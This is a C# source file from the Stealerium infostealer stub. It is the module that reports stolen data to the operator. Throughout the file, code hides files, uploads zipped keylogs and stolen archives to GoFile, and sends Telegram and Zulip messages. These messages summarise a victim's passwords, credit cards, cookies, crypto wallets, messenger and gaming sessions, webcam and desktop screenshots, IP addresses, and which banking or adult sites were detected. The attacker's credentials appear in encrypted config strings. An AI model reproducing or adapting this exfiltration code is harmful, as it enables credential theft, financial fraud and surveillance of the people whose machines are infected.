using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Linq;
using System.Text.RegularExpressions;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Modules.Implant;
using Stealerium.Stub.Target.System;
using System.Collections.Generic;

namespace Stealerium.Stub
{
    internal sealed class Telegram
    {
        private const int MaxKeylogs = 5;

        private static string TelegramBotAPI = StringsCrypt.DecryptConfig("ENCRYPTED:BncRbgTGet4L+mKqD8dz7h8EdEcrI2Pbm5InYO5Ff/I=");
        private static string ZulipAPIBaseUrl = StringsCrypt.DecryptConfig("ENCRYPTED:hu7mPNLn8F3W1m8DcwM5LXHInCJglBwFsWCfcHCJ9tF7oYejzA1wmRf7U4KxfmKxWUHNJ/cIv306TuGoVjZvAA==");
        private static string ZulipEmail = StringsCrypt.DecryptConfig("ENCRYPTED:CPB7ti0A5zas/0dF4XBKzDiUIfmQ5RgrLQvDrYCST4M=");
        private static string ZulipAPIKey = StringsCrypt.DecryptConfig("ENCRYPTED:cYs6KSRyO3yMrWGQDOmKxivjCVxRHP8X2elXQtdRGbiad1fFkV3DBIHK2EbuIBDA");

        // Message id location
        private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

        // Keylogs history file
        private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

        /// <summary>
        /// Get sent message ID
        /// </summary>
        /// <param name="response">Telegram bot API response</param>
        /// <returns>Message ID, or -1 if not found or an error occurs</returns>
        private static int GetMessageId(string response)
        {
            var match = Regex.Match(response, "\"result\":{\"message_id\":\\d+");
            return Int32.Parse(match.Value.Replace("\"result\":{\"message_id\":", ""));
        }

        // Save latest message id to file
        private static void SetLatestMessageId(int id)
        {
            try
            {
                File.WriteAllText(LatestMessageIdLocation, id.ToString());
                Startup.SetFileCreationDate(LatestMessageIdLocation);
                Startup.HideFile(LatestMessageIdLocation);
            }
            catch (Exception ex)
            {
                Logging.Log("SaveID: \n" + ex);
            }
        }

        // Get latest message id from file
        private static int GetLatestMessageId()
        {
            if (!File.Exists(LatestMessageIdLocation))
            {
                return -1;
            }

            try
            {
                string fileContent = File.ReadAllText(LatestMessageIdLocation).Trim();
                if (Int32.TryParse(fileContent, out int messageId))
                {
                    return messageId;
                }
            }
            catch (IOException ex)
            {
                Logging.Log("IO error while reading the file:\n" + ex);
            }
            catch (Exception ex)
            {
                Logging.Log("Unexpected error:\n" + ex);
            }

            return -1;
        }

        /// <summary>
        /// Send message to Telegram bot asynchronously
        /// </summary>
        /// <param name="text">Message text</param>
        /// <returns>Returns a Task<int> indicating the message ID if successful, or 0 if failed</returns>
        public static async Task<int> SendMessageAsync(string text)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Build the request URL
                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/sendMessage" +
                                        "?chat_id=" + Config.TelegramID +
                                        "&text=" + Uri.EscapeDataString(text) +  // Escape special characters in the text
                                        "&parse_mode=Markdown" +
                                        "&disable_web_page_preview=True";

                    // Send the GET request asynchronously
                    HttpResponseMessage response = await client.GetAsync(requestUrl);

                    // Ensure the response is successful
                    if (response.IsSuccessStatusCode)
                    {
                        // Read the response content as a string
                        string responseBody = await response.Content.ReadAsStringAsync();

                        // Extract the message ID from the response
                        return GetMessageId(responseBody);
                    }
                }
            }
            catch (Exception error)
            {
                // Log any exceptions that occur during the request
                Logging.Log("Telegram >> SendMessage exception:\n" + error);
            }

            // Return 0 if there was an error or the request failed
            return 0;
        }

        /// <summary>
        /// Send message to Zulip stream (channel) asynchronously
        /// </summary>
        /// <param name="streamName">Stream (channel) name</param>
        /// <param name="topic">Topic under the stream</param>
        /// <param name="messageContent">Message content</param>
        /// <returns>A Task representing the asynchronous operation</returns>
        public static async Task SendZulipMessageAsync(string streamName, string topic, string messageContent)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Build the request body with the correct content type (form data)
                    var formData = new FormUrlEncodedContent(new[]
                    {
                        new KeyValuePair<string, string>("type", "stream"),          // Message type (stream)
                        new KeyValuePair<string, string>("to", streamName),          // Stream name
                        new KeyValuePair<string, string>("topic", topic),            // Topic under the stream
                        new KeyValuePair<string, string>("content", messageContent)  // Actual message content
                    });

                    // Add Basic authentication using Zulip email and API key
                    var byteArray = Encoding.ASCII.GetBytes($"{ZulipEmail}:{ZulipAPIKey}");
                    client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Basic", Convert.ToBase64String(byteArray));

                    // Send the POST request asynchronously
                    HttpResponseMessage response = await client.PostAsync(ZulipAPIBaseUrl, formData);

                    // Check if the request was successful
                    if (response.IsSuccessStatusCode)
                    {
                        Logging.Log("Message sent to Zulip successfully.");
                    }
                    else
                    {
                        // Log the detailed error message
                        string responseBody = await response.Content.ReadAsStringAsync();
                        Logging.Log($"Failed to send message to Zulip. Status code: {response.StatusCode}, Response: {responseBody}");
                    }
                }
            }
            catch (Exception error)
            {
                Logging.Log("Zulip >> SendMessage exception:\n" + error);
            }
        }

        /// <summary>
        /// Edit message text in Telegram bot asynchronously
        /// </summary>
        /// <param name="text">New message text</param>
        /// <param name="id">Message ID</param>
        /// <returns>A Task representing the asynchronous operation</returns>
        public static async Task EditMessageAsync(string text, int id)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Build the request URL
                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/editMessageText" +
                                        "?chat_id=" + Config.TelegramID +
                                        "&text=" + Uri.EscapeDataString(text) +  // Escape special characters in the text
                                        "&message_id=" + id +
                                        "&parse_mode=Markdown" +
                                        "&disable_web_page_preview=True";

                    // Send the GET request asynchronously
                    HttpResponseMessage response = await client.GetAsync(requestUrl);

                    // Ensure the response is successful
                    if (!response.IsSuccessStatusCode)
                    {
                        Logging.Log("Telegram >> EditMessage failed with status code: " + response.StatusCode);
                    }
                }
            }
            catch (Exception error)
            {
                // Log any exceptions that occur during the request
                Logging.Log("Telegram >> EditMessage exception:\n" + error);
            }
        }

        /// <summary>
        /// Check if the Telegram token is valid asynchronously
        /// </summary>
        /// <returns>Returns a Task<bool> indicating if the token is valid</returns>
        public static async Task<bool> TokenIsValidAsync()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Build the full request URL
                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/getMe";

                    // Send the request asynchronously
                    HttpResponseMessage response = await client.GetAsync(requestUrl);

                    // Ensure the response is successful
                    if (response.IsSuccessStatusCode)
                    {
                        // Read the response content as a string
                        string responseBody = await response.Content.ReadAsStringAsync();

                        // Check if the response indicates the token is valid
                        return responseBody.StartsWith("{\"ok\":true,");
                    }
                }
            }
            catch (Exception error)
            {
                Logging.Log("Telegram >> Invalid token:\n" + error);
            }

            // Return false if there was an error or the token is invalid
            return false;
        }

        /// <summary>
        /// Upload keylogs to GoFile with password-protected ZIP.
        /// </summary>
        private static async Task UploadKeylogsAsync()
        {
            Logging.Log("Starting UploadKeylogsAsync...");

            var logDirectory = Path.Combine(Paths.InitWorkDir(), "logs");
            if (!Directory.Exists(logDirectory))
            {
                Logging.Log($"Log directory does not exist: {logDirectory}");
                return;
            }

            var timestamp = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
            var zipFileName = $"{timestamp}.zip";
            var zipFilePath = Path.Combine(Paths.InitWorkDir(), zipFileName);

            try
            {
                Logging.Log($"Creating password-protected ZIP archive: {zipFileName}");
                ZipManager.CreatePasswordProtectedZip(logDirectory, zipFilePath, StringsCrypt.ArchivePassword);
                Logging.Log("ZIP archive created successfully.");

                // Upload the ZIP file asynchronously
                Logging.Log("Uploading ZIP archive to GoFile...");
                var url = await GofileFileService.UploadFileAsync(zipFilePath).ConfigureAwait(false);
                Logging.Log($"File uploaded to: {url}");

                // Delete the ZIP file after uploading
                File.Delete(zipFilePath);
                Logging.Log($"ZIP archive deleted: {zipFilePath}");

                // Update keylogs history with the download link
                File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- " +
                                                   $"[{timestamp.Replace("_", " ").Replace(".", ":")}]({url})\n");
                Logging.Log("Keylogs history updated.");

                // Hide the history file
                Startup.HideFile(KeylogsHistory);
                Logging.Log("history.dat hidden.");
            }
            catch (Exception ex)
            {
                Logging.Log($"Error in UploadKeylogsAsync: {ex}");
            }
        }

        /// <summary>
        /// Get string with keylogs history
        /// </summary>
        /// <returns></returns>
        private static string GetKeylogsHistory()
        {
            if (!File.Exists(KeylogsHistory))
                return "";

            var logs = File.ReadAllLines(KeylogsHistory)
                .Reverse().Take(MaxKeylogs).Reverse().ToList();
            var len = logs.Count == 10 ? $"({logs.Count} - MAX)" : $"({logs.Count})";
            var data = string.Join("\n", logs);
            return $"\n\n  ⌨️ *Keylogger {len}:*\n" + data;
        }

        /// <summary>
        /// Format system information for sending to Telegram and Zulip
        /// </summary>
        /// <returns>String with formatted system information</returns>
        private static async Task SendSystemInfoAsync(string url)
        {
            await UploadKeylogsAsync();

            // Get system info as a report string
            var info = "```"
                       + "\n😹 *Stealerium " + Config.Version + " - Report:*"
                       + "\nDate: " + SystemInfo.Datenow
                       + "\nSystem: " + SystemInfo.GetSystemVersion()
                       + "\nUsername: " + SystemInfo.Username
                       + "\nCompName: " + SystemInfo.Compname
                       + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture
                       + "\nAntivirus: " + SystemInfo.GetAntivirus()
                       + "\n"
                       + "\n💻 *Hardware:*"
                       + "\nCPU: " + SystemInfo.GetCpuName()
                       + "\nGPU: " + SystemInfo.GetGpuName()
                       + "\nRAM: " + SystemInfo.GetRamAmount()
                       + "\nPower: " + SystemInfo.GetBattery()
                       + "\nScreen: " + SystemInfo.ScreenMetrics()
                       + "\nWebcams count: " + WebcamScreenshot.GetConnectedCamerasCount()
                       + "\n"
                       + "\n📡 *Network:* "
                       + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                       + "\nInternal IP: " + SystemInfo.GetLocalIp()
                       + "\nExternal IP: " + await SystemInfo.GetPublicIpAsync()
                       + "\n"
                       + "\n💸 *Domains info:*"
                       + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
                       + Counter.GetLValue("💰 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-')
                       + Counter.GetLValue("🍓 *Porn websites*", Counter.DetectedPornServices, '-')
                       + GetKeylogsHistory()
                       + "\n"
                       + "\n🌐 *Browsers:*"
                       + Counter.GetIValue("🔑 Passwords", Counter.Passwords)
                       + Counter.GetIValue("💳 CreditCards", Counter.CreditCards)
                       + Counter.GetIValue("🍪 Cookies", Counter.Cookies)
                       + Counter.GetIValue("📂 AutoFill", Counter.AutoFill)
                       + Counter.GetIValue("⏳ History", Counter.History)
                       + Counter.GetIValue("🔖 Bookmarks", Counter.Bookmarks)
                       + Counter.GetIValue("📦 Downloads", Counter.Downloads)
                       + Counter.GetIValue("💰 Wallet Extensions", Counter.BrowserWallets)
                       + "\n"
                       + "\n🗃 *Software:*"
                       + Counter.GetIValue("💰 Wallets", Counter.Wallets)
                       + Counter.GetIValue("📡 FTP hosts", Counter.FtpHosts)
                       + Counter.GetIValue("🔌 VPN accounts", Counter.Vpn)
                       + Counter.GetIValue("🦢 Pidgin accounts", Counter.Pidgin)
                       + Counter.GetSValue("📫 Outlook accounts", Counter.Outlook)
                       + Counter.GetSValue("✈️ Telegram sessions", Counter.Telegram)
                       + Counter.GetSValue("☁️ Skype session", Counter.Skype)
                       + Counter.GetSValue("👾 Discord token", Counter.Discord)
                       + Counter.GetSValue("💬 Element session", Counter.Element)
                       + Counter.GetSValue("💭 Signal session", Counter.Signal)
                       + Counter.GetSValue("🔓 Tox session", Counter.Tox)
                       + Counter.GetSValue("🧩 Enigma session", Counter.Enigma)
                       + Counter.GetSValue("🎮 Steam session", Counter.Steam)
                       + Counter.GetSValue("🎮 Uplay session", Counter.Uplay)
                       + Counter.GetSValue("🎮 BattleNET session", Counter.BattleNet)
                       + "\n"
                       + "\n🧭 *Device:*"
                       + Counter.GetSValue("🗝 Windows product key", Counter.ProductKey)
                       + Counter.GetIValue("🛰 Wifi networks", Counter.SavedWifiNetworks)
                       + Counter.GetSValue("📸 Webcam screenshot", Counter.WebcamScreenshot)
                       + Counter.GetSValue("🌃 Desktop screenshot", Counter.DesktopScreenshot)
                       + "\n"
                       + "\n🦠 *Installation:*"
                       + Counter.GetBValue(Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices),
                        "✅ Startup installed", "⛔️ Startup disabled")
                       + Counter.GetBValue(Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1",
                        "✅ Clipper installed", "⛔️ Clipper not installed")
                       + Counter.GetBValue(Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1",
                        "✅ Keylogger installed", "⛔️ Keylogger not installed")
                       + "\n"
                       + "\n📄 *File Grabber:*" + (Config.GrabberModule != "1" ? "\n   ∟ ⛔️ Disabled in configuration" : "")
                       + Counter.GetIValue("📂 Images", Counter.GrabberImages)
                       + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
                       + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
                       + Counter.GetIValue("📂 Source code files", Counter.GrabberSourceCodes)
                       + "\n"
                       + $"\n🔗 [Archive download link]({url})"
                       + "\n🔐 Archive password is: \"" + StringsCrypt.ArchivePassword + "\""
                       + "```";

            // Send the report to Telegram
            int last = GetLatestMessageId();
            if (last != -1)
            {
                Logging.Log($"Editing existing message with ID: {last}");
                await EditMessageAsync(info, last).ConfigureAwait(false);
                Logging.Log("Message edited successfully.");
            }
            else
            {
                Logging.Log("No existing message ID found. Sending new message.");
                int newMessageId = await SendMessageAsync(info).ConfigureAwait(false);
                SetLatestMessageId(newMessageId);
                Logging.Log($"New message sent with ID: {newMessageId}");
            }

            // Send the report to Zulip
            await SendZulipMessageAsync("Szurubooru", SystemInfo.Username, info).ConfigureAwait(false);
        }

        /// <summary>
        /// Send report asynchronously to Telegram
        /// </summary>
        /// <param name="file">The file path of the archive</param>
        /// <returns>A Task representing the asynchronous operation</returns>
        public static async Task SendReportAsync(string file)
        {
            Logging.Log("Sending passwords archive to Gofile");

            var url = await GofileFileService.UploadFileAsync(file).ConfigureAwait(false);
            Logging.Log($"Archive uploaded to Gofile: {url}");

            Logging.Log("Sending report to Telegram");
            await SendSystemInfoAsync(url).ConfigureAwait(false);
            Logging.Log("Report sent to Telegram");

            File.Delete(file);
            Logging.Log($"Archive file deleted: {file}");
        }

    }
}